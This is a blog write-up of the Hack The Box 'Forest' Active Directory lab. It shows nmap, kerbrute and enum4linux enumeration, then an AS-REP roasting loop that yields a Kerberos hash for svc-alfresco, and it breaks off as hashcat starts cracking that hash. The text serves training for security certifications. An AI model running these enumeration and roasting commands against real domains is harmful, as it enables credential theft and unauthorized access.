---
title: Write-up Forest on HTB
author: eMVee
date: 2024-11-05 00:00:00 +0000
categories: [CTF, HTB]
tags: [HTB, OSCP, OSEP, AD, Active Directory, Kerberos, ASREPRoasting, ACL, WriteDacl, GenericALL, DCSync, DCSync-attack, Pass-The-Hash]
render_with_liquid: false
---

The Hack The Box "Forest" vulnerable machine is an exceptional resource for cybersecurity enthusiasts, particularly those preparing for certifications like OSCP and OSEP. This machine has setup an Active Directory (AD) environment, where some known vulnerabilities can be exploited to prepare yourself for OSCP or OSEP. It has been a while ago I have hacked this machine, but I had not yet written a writeup.

## Getting started
As mentioned earlier the machine can be played on HTB, so an active VPN connection should be established before spawning this machine.
Before starting we have to create a working directory for this machine. Then I love to assign the IP address of the target to a variable. After spawning Forest on HTB we should create a working directory and assign the IP address to a variable in the temrinal.

```bash
┌──(emvee㉿kali)-[~]
└─$ cd ~/Documents/HTB

┌──(emvee㉿kali)-[~/Documents/HTB]
└─$ mcd Forest

┌──(emvee㉿kali)-[~/Documents/HTB]
└─$ ip=10.129.185.152
```

## Enumeration
Now we are ready to rumble. Let's start with a simple ping request to the target to see if it is responding.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Forest]
└─$ ping $ip -c 3
PING 10.129.185.152 (10.129.185.152) 56(84) bytes of data.
64 bytes from 10.129.185.152: icmp_seq=1 ttl=127 time=61.3 ms
64 bytes from 10.129.185.152: icmp_seq=2 ttl=127 time=57.3 ms
64 bytes from 10.129.185.152: icmp_seq=3 ttl=127 time=62.8 ms

--- 10.129.185.152 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2007ms
rtt min/avg/max/mdev = 57.329/60.485/62.849/2.322 ms

```
Based on the `ttl` value in the response we can asume that this machine is running on a Windows OS. Now we should run a port scan with nmap to enumerate the open ports and services.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Forest]
└─$ sudo nmap -sC -sV -T4 -A -O -p- $ip -Pn
[sudo] password for emvee: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 13:27 CEST
Nmap scan report for 10.129.185.152
Host is up (0.057s latency).
Not shown: 65512 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-05-17 11:35:01Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49681/tcp open  msrpc        Microsoft Windows RPC
49699/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=5/17%OT=53%CT=1%CU=33908%PV=Y%DS=2%DC=T%G=Y%TM=6464BA9
OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S%TS=
OS:A)OPS(O1=M539NW8ST11%O2=M539NW8ST11%O3=M539NW8NNT11%O4=M539NW8ST11%O5=M5
OS:39NW8ST11%O6=M539ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=200
OS:0)ECN(R=Y%DF=Y%T=80%W=2000%O=M539NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S
OS:+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=
OS:)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%
OS:A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIP
OS:CK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-05-17T11:36:05
|_  start_date: 2023-05-17T11:31:05
|_clock-skew: mean: 2h26m50s, deviation: 4h02m32s, median: 6m48s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2023-05-17T04:36:08-07:00

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   43.08 ms 10.10.14.1
2   54.32 ms 10.129.185.152

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 138.74 seconds

```
We should add some information to our notes and based on some information from the poerts we can tell this machine is running as Domain Controller.
The following information has been added to my notes:
* Port 88
	* Kerberos
* Port 389
	* LDAP
* Port 445
	* SMB


Let's brute force some users with kerbrute.

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Forest]
└─$ kerbrute userenum --dc $ip -d htb.LOCAL /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 05/17/23 - Ronnie Flathers @ropnop

2023/05/17 13:34:31 >  Using KDC(s):
2023/05/17 13:34:31 >   10.129.185.152:88

2023/05/17 13:34:31 >  [+] VALID USERNAME:       mark@htb.LOCAL
2023/05/17 13:34:32 >  [+] VALID USERNAME:       andy@htb.LOCAL
2023/05/17 13:34:38 >  [+] VALID USERNAME:       forest@htb.LOCAL
2023/05/17 13:34:42 >  [+] VALID USERNAME:       Mark@htb.LOCAL
2023/05/17 13:34:43 >  [+] VALID USERNAME:       administrator@htb.LOCAL

```

Within a minute kerbrute discovered 4 unique users... While this is running, we can start enum4linux to see if there is more information to discover.


```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Forest]
└─$ enum4linux $ip
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed May 17 13:37:08 2023

 =========================================( Target Information )=========================================

Target ........... 10.129.185.152
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 10.129.185.152 )===========================


[E] Can't find workgroup/domain



 ===============================( Nbtstat Information for 10.129.185.152 )===============================

Looking up status of 10.129.185.152
No reply from 10.129.185.152

 ==================================( Session Check on 10.129.185.152 )==================================


[+] Server 10.129.185.152 allows sessions using username '', password ''


 ===============================( Getting domain SID for 10.129.185.152 )===============================

Domain Name: HTB
Domain Sid: S-1-5-21-3072663084-364016917-1341370565

[+] Host is part of a domain (not a workgroup)


 ==================================( OS information on 10.129.185.152 )==================================


[E] Can't get OS info with smbclient


[+] Got OS info for 10.129.185.152 from srvinfo: 
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED


 ======================================( Users on 10.129.185.152 )======================================

index: 0x2137 RID: 0x463 acb: 0x00020015 Account: $331000-VK4ADACQNUCA  Name: (null)    Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00000010 Account: Administrator  Name: Administrator     Desc: Built-in account for administering the computer/domain
index: 0x2369 RID: 0x47e acb: 0x00000210 Account: andy  Name: Andy Hislip       Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0x2352 RID: 0x478 acb: 0x00000210 Account: HealthMailbox0659cc1  Name: HealthMailbox-EXCH01-010  Desc: (null)
index: 0x234b RID: 0x471 acb: 0x00000210 Account: HealthMailbox670628e  Name: HealthMailbox-EXCH01-003  Desc: (null)
index: 0x234d RID: 0x473 acb: 0x00000210 Account: HealthMailbox6ded678  Name: HealthMailbox-EXCH01-005  Desc: (null)
index: 0x2351 RID: 0x477 acb: 0x00000210 Account: HealthMailbox7108a4e  Name: HealthMailbox-EXCH01-009  Desc: (null)
index: 0x234e RID: 0x474 acb: 0x00000210 Account: HealthMailbox83d6781  Name: HealthMailbox-EXCH01-006  Desc: (null)
index: 0x234c RID: 0x472 acb: 0x00000210 Account: HealthMailbox968e74d  Name: HealthMailbox-EXCH01-004  Desc: (null)
index: 0x2350 RID: 0x476 acb: 0x00000210 Account: HealthMailboxb01ac64  Name: HealthMailbox-EXCH01-008  Desc: (null)
index: 0x234a RID: 0x470 acb: 0x00000210 Account: HealthMailboxc0a90c9  Name: HealthMailbox-EXCH01-002  Desc: (null)
index: 0x2348 RID: 0x46e acb: 0x00000210 Account: HealthMailboxc3d7722  Name: HealthMailbox-EXCH01-Mailbox-Database-1118319013  Desc: (null)
index: 0x2349 RID: 0x46f acb: 0x00000210 Account: HealthMailboxfc9daad  Name: HealthMailbox-EXCH01-001  Desc: (null)
index: 0x234f RID: 0x475 acb: 0x00000210 Account: HealthMailboxfd87238  Name: HealthMailbox-EXCH01-007  Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x2360 RID: 0x47a acb: 0x00000210 Account: lucinda       Name: Lucinda Berger    Desc: (null)
index: 0x236a RID: 0x47f acb: 0x00000210 Account: mark  Name: Mark Brandt       Desc: (null)
index: 0x236b RID: 0x480 acb: 0x00000210 Account: santi Name: Santi Rodriguez   Desc: (null)
index: 0x235c RID: 0x479 acb: 0x00000210 Account: sebastien     Name: Sebastien Caron   Desc: (null)
index: 0x215a RID: 0x468 acb: 0x00020011 Account: SM_1b41c9286325456bb  Name: Microsoft Exchange Migration      Desc: (null)
index: 0x2161 RID: 0x46c acb: 0x00020011 Account: SM_1ffab36a2f5f479cb  Name: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}       Desc: (null)
index: 0x2156 RID: 0x464 acb: 0x00020011 Account: SM_2c8eef0a09b545acb  Name: Microsoft Exchange Approval Assistant     Desc: (null)
index: 0x2159 RID: 0x467 acb: 0x00020011 Account: SM_681f53d4942840e18  Name: Discovery Search Mailbox  Desc: (null)
index: 0x2158 RID: 0x466 acb: 0x00020011 Account: SM_75a538d3025e4db9a  Name: Microsoft Exchange        Desc: (null)
index: 0x215c RID: 0x46a acb: 0x00020011 Account: SM_7c96b981967141ebb  Name: E4E Encryption Store - Active     Desc: (null)
index: 0x215b RID: 0x469 acb: 0x00020011 Account: SM_9b69f1b9d2cc45549  Name: Microsoft Exchange Federation Mailbox     Desc: (null)
index: 0x215d RID: 0x46b acb: 0x00020011 Account: SM_c75ee099d0a64c91b  Name: Microsoft Exchange        Desc: (null)
index: 0x2157 RID: 0x465 acb: 0x00020011 Account: SM_ca8c2ed5bdab4dc9b  Name: Microsoft Exchange        Desc: (null)
index: 0x2365 RID: 0x47b acb: 0x00010210 Account: svc-alfresco  Name: svc-alfresco      Desc: (null)

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]

 ================================( Share Enumeration on 10.129.185.152 )================================
                                                                                                                                                                                                                   
do_connect: Connection to 10.129.185.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)                                                                                                                          

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.129.185.152                                                                                                                                                                     
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
 ===========================( Password Policy Information for 10.129.185.152 )===========================
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   

[+] Attaching to 10.129.185.152 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.129.185.152)

[+] Trying protocol 445/SMB...

[+] Found domain(s):

        [+] HTB
        [+] Builtin

[+] Password Info for Domain: HTB

        [+] Minimum password length: 7
        [+] Password history length: 24
        [+] Maximum password age: Not Set
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: 1 day 4 minutes 
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set



[+] Retieved partial password policy with rpcclient:                                                                                                                                                               
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
Password Complexity: Disabled                                                                                                                                                                                      
Minimum Password Length: 7


 ======================================( Groups on 10.129.185.152 )======================================
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
[+] Getting builtin groups:                                                                                                                                                                                        
                                                                                                                                                                                                                   
group:[Account Operators] rid:[0x224]                                                                                                                                                                              
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Administrators] rid:[0x220]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Print Operators] rid:[0x226]
group:[Backup Operators] rid:[0x227]
group:[Replicator] rid:[0x228]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[System Managed Accounts Group] rid:[0x245]
group:[Storage Replica Administrators] rid:[0x246]
group:[Server Operators] rid:[0x225]

[+]  Getting builtin group memberships:                                                                                                                                                                            
                                                                                                                                                                                                                   
Group: System Managed Accounts Group' (RID: 581) has member: Couldn't lookup SIDs                                                                                                                                  
Group: Administrators' (RID: 544) has member: Couldn't lookup SIDs
Group: Remote Management Users' (RID: 580) has member: Couldn't lookup SIDs
Group: Pre-Windows 2000 Compatible Access' (RID: 554) has member: Couldn't lookup SIDs
Group: Windows Authorization Access Group' (RID: 560) has member: Couldn't lookup SIDs
Group: Account Operators' (RID: 548) has member: Couldn't lookup SIDs
Group: Users' (RID: 545) has member: Couldn't lookup SIDs
Group: Guests' (RID: 546) has member: Couldn't lookup SIDs
Group: IIS_IUSRS' (RID: 568) has member: Couldn't lookup SIDs

[+]  Getting local groups:                                                                                                                                                                                         
                                                                                                                                                                                                                   
group:[Cert Publishers] rid:[0x205]                                                                                                                                                                                
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44d]

[+]  Getting local group memberships:                                                                                                                                                                              
                                                                                                                                                                                                                   
Group: Denied RODC Password Replication Group' (RID: 572) has member: Couldn't lookup SIDs                                                                                                                         

[+]  Getting domain groups:                                                                                                                                                                                        
                                                                                                                                                                                                                   
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]                                                                                                                                                        
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Organization Management] rid:[0x450]
group:[Recipient Management] rid:[0x451]
group:[View-Only Organization Management] rid:[0x452]
group:[Public Folder Management] rid:[0x453]
group:[UM Management] rid:[0x454]
group:[Help Desk] rid:[0x455]
group:[Records Management] rid:[0x456]
group:[Discovery Management] rid:[0x457]
group:[Server Management] rid:[0x458]
group:[Delegated Setup] rid:[0x459]
group:[Hygiene Management] rid:[0x45a]
group:[Compliance Management] rid:[0x45b]
group:[Security Reader] rid:[0x45c]
group:[Security Administrator] rid:[0x45d]
group:[Exchange Servers] rid:[0x45e]
group:[Exchange Trusted Subsystem] rid:[0x45f]
group:[Managed Availability Servers] rid:[0x460]
group:[Exchange Windows Permissions] rid:[0x461]
group:[ExchangeLegacyInterop] rid:[0x462]
group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]
group:[Service Accounts] rid:[0x47c]
group:[Privileged IT Accounts] rid:[0x47d]
group:[test] rid:[0x13ed]

[+]  Getting domain group memberships:                                                                                                                                                                             
                                                                                                                                                                                                                   
Group: 'Managed Availability Servers' (RID: 1120) has member: HTB\EXCH01$                                                                                                                                          
Group: 'Managed Availability Servers' (RID: 1120) has member: HTB\Exchange Servers
Group: 'Group Policy Creator Owners' (RID: 520) has member: HTB\Administrator
Group: 'Domain Users' (RID: 513) has member: HTB\Administrator
Group: 'Domain Users' (RID: 513) has member: HTB\DefaultAccount
Group: 'Domain Users' (RID: 513) has member: HTB\krbtgt
Group: 'Domain Users' (RID: 513) has member: HTB\$331000-VK4ADACQNUCA
Group: 'Domain Users' (RID: 513) has member: HTB\SM_2c8eef0a09b545acb
Group: 'Domain Users' (RID: 513) has member: HTB\SM_ca8c2ed5bdab4dc9b
Group: 'Domain Users' (RID: 513) has member: HTB\SM_75a538d3025e4db9a
Group: 'Domain Users' (RID: 513) has member: HTB\SM_681f53d4942840e18
Group: 'Domain Users' (RID: 513) has member: HTB\SM_1b41c9286325456bb
Group: 'Domain Users' (RID: 513) has member: HTB\SM_9b69f1b9d2cc45549
Group: 'Domain Users' (RID: 513) has member: HTB\SM_7c96b981967141ebb
Group: 'Domain Users' (RID: 513) has member: HTB\SM_c75ee099d0a64c91b
Group: 'Domain Users' (RID: 513) has member: HTB\SM_1ffab36a2f5f479cb
Group: 'Domain Users' (RID: 513) has member: HTB\HealthMailboxc3d7722
Group: 'Domain Users' (RID: 513) has member: HTB\HealthMailboxfc9daad
Group: 'Domain Users' (RID: 513) has member: HTB\HealthMailboxc0a90c9
Group: 'Domain Users' (RID: 513) has member: HTB\HealthMailbox670628e
Group: 'Domain Users' (RID: 513) has member: HTB\HealthMailbox968e74d
Group: 'Domain Users' (RID: 513) has member: HTB\HealthMailbox6ded678
Group: 'Domain Users' (RID: 513) has member: HTB\HealthMailbox83d6781
Group: 'Domain Users' (RID: 513) has member: HTB\HealthMailboxfd87238
Group: 'Domain Users' (RID: 513) has member: HTB\HealthMailboxb01ac64
Group: 'Domain Users' (RID: 513) has member: HTB\HealthMailbox7108a4e
Group: 'Domain Users' (RID: 513) has member: HTB\HealthMailbox0659cc1
Group: 'Domain Users' (RID: 513) has member: HTB\sebastien
Group: 'Domain Users' (RID: 513) has member: HTB\lucinda
Group: 'Domain Users' (RID: 513) has member: HTB\svc-alfresco
Group: 'Domain Users' (RID: 513) has member: HTB\andy
Group: 'Domain Users' (RID: 513) has member: HTB\mark
Group: 'Domain Users' (RID: 513) has member: HTB\santi
Group: 'Exchange Windows Permissions' (RID: 1121) has member: HTB\Exchange Trusted Subsystem
Group: '$D31000-NSEL5BRJ63V7' (RID: 1133) has member: HTB\EXCH01$
Group: 'Domain Guests' (RID: 514) has member: HTB\Guest
Group: 'Organization Management' (RID: 1104) has member: HTB\Administrator
Group: 'Service Accounts' (RID: 1148) has member: HTB\svc-alfresco
Group: 'Enterprise Admins' (RID: 519) has member: HTB\Administrator
Group: 'Domain Admins' (RID: 512) has member: HTB\Administrator
Group: 'Privileged IT Accounts' (RID: 1149) has member: HTB\Service Accounts
Group: 'Schema Admins' (RID: 518) has member: HTB\Administrator
Group: 'Exchange Servers' (RID: 1118) has member: HTB\EXCH01$
Group: 'Exchange Servers' (RID: 1118) has member: HTB\$D31000-NSEL5BRJ63V7
Group: 'Domain Controllers' (RID: 516) has member: HTB\FOREST$
Group: 'Exchange Trusted Subsystem' (RID: 1119) has member: HTB\EXCH01$
Group: 'Domain Computers' (RID: 515) has member: HTB\EXCH01$

 =================( Users on 10.129.185.152 via RID cycling (RIDS: 500-550,1000-1050) )=================
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.                                                                                                                                          
                                                                                                                                                                                                                   
                                                                                                                                                                                                                   
 ==============================( Getting printer info for 10.129.185.152 )==============================
                                                                                                                                                                                                                   
do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED                                                                                                                                            


enum4linux complete on Wed May 17 13:39:37 2023
```
We have discovered a lot of users with enum4linux, so let's add them to a users list which we can utilize in a next attack.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Forest]
└─$ nano users.txt 

┌──(emvee㉿kali)-[~/Documents/HTB/Forest]
└─$ cat users.txt        
Administrator
andy
lucinda
mark
santi
sebastien
svc-alfresco

```

Perhaps we can use AS-REP Roasting as attack vector. AS-REP Roasting  is an attack against Kerberos for user accounts that do not require pre-authentication. If we get a TGT back we can crack the hash with Hashcat or John The Ripper.
To see is we get any TGT back for those users we can utilize a simple for loop.

```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Forest]
└─$ for user in $(cat users.txt); do GetNPUsers.py -no-pass -dc-ip $ip htb/${user} | grep -v Impacket; done 
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.

[*] Getting TGT for Administrator
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.

[*] Getting TGT for andy
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.

[*] Getting TGT for lucinda
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.

[*] Getting TGT for mark
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.

[*] Getting TGT for santi
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.

[*] Getting TGT for sebastien
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.

[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB:b7289cb008c7f4599eab770bf00d706f$8e6bb582361a38e0fa62658c26eec7910ea6ffc37b41924cd8eda8e4d74ccade54b6061b40807a5174ccab90f96a517def03168a37a0f7a623a50d790d281b07205c2ad062b21f1db353483f57dd57fc9c2c467ea80940822bb832ec9943898f06b21822d3881eea5a4f474bdb52a0e942274e2323986df69d887fbad9ed47d7c48438b49de1acabde782f3b09e6944cd470ea221b31e5e4d5d804bcd9ef56b84a88f2f5a91f5674523e331d0b037ae883d7a397c6c0abd39871be6e68dbebb7c6908b91ebece7705ad97dc651a0a95cfb6fdf9a8065b69b4c20d9796bcdfbbf
```
We got a ticket for the `svc-alfresco` user. We can crack this with Hashcat. First we have to create a file for the hash.
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Forest]
└─$ nano hashes.asreproast

┌──(emvee㉿kali)-[~/Documents/HTB/Forest]
└─$ cat hashes.asreproast 
$krb5asrep$23$svc-alfresco@HTB:b7289cb008c7f4599eab770bf00d706f$8e6bb582361a38e0fa62658c26eec7910ea6ffc37b41924cd8eda8e4d74ccade54b6061b40807a5174ccab90f96a517def03168a37a0f7a623a50d790d281b07205c2ad062b21f1db353483f57dd57fc9c2c467ea80940822bb832ec9943898f06b21822d3881eea5a4f474bdb52a0e942274e2323986df69d887fbad9ed47d7c48438b49de1acabde782f3b09e6944cd470ea221b31e5e4d5d804bcd9ef56b84a88f2f5a91f5674523e331d0b037ae883d7a397c6c0abd39871be6e68dbebb7c6908b91ebece7705ad97dc651a0a95cfb6fdf9a8065b69b4c20d9796bcdfbbf
```
Now we are ready, so let's do it! 
```bash
┌──(emvee㉿kali)-[~/Documents/HTB/Forest]
└─$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt
[sudo] password for emvee: 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-9750H CPU @ 2.60GHz, 6925/13915 MB (2048 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

